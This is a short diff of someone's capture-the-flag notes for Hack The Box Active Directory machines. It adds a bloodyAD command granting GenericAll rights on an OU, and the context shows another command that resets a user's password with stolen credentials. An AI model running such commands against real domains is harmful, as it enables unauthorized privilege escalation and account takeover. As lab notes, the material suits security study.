@@ -63,7 +63,8 @@ YXkQXyzbnB69RuDjUy_a2s0MpSEIH8SY
 Silvercore_21
 -------------------------------------------------------------------------------------------------------------------------------------------------
 # GenericAll
-
+     
+     $ bloodyAD -d scepter.htb -u a.carter -p Password123 --host dc01.scepter.htb --dc-ip $(cat /etc/hosts | grep scepter.htb | cut -d ' ' -f 1) add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
 # смена пароля 
     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
 # Shadow Credential
